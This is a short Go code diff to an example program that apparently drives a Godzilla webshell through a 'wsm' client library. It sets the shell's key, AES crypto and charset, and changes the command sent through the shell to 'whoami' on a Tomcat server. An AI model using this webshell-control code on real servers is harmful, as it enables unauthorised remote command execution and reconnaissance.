@@ -30,7 +30,7 @@ func main() {
 		},
 		Key:      "key",
 		Crypto:   godzilla.JAVA_AES_BASE64,
-		Encoding: godzilla.Chardet,
+		Encoding: godzilla.UTF8CharSet,
 	}
 	g, err := wsm.NewGodzillaInfo(info)
 	if err != nil {
@@ -43,6 +43,7 @@ func main() {
 	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
 	//fmt.Println("Info : ", basicInfo1)
 
-	basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
+	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
+	basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
 	fmt.Println("Info : ", basicInfo)
 }
